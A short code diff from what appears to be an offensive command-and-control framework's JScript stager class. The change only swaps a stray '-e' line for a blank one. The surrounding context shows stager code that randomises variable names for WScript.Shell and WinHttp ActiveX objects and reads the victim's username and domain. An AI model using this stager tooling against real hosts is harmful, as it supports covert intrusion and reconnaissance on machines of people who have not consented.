@@ -43,7 +43,7 @@ class JScriptStager(Stager):
         self.variables['x-frame-options'] = (util.generate_str(), 'SAMEORIGIN')
         self.variables['wscript.shell'] = (util.generate_str(), 'new ActiveXObject("WScript.Shell");')
         self.variables['winhttp.winhttprequest'] = (util.generate_str(), 'new ActiveXObject("WinHttp.WinHttpRequest.5.1");')
-e
+
         wscript = self.variables['wscript.shell'][0]
         self.variables['username'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERNAME%");')
         self.variables['domain'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERDOMAIN%");')
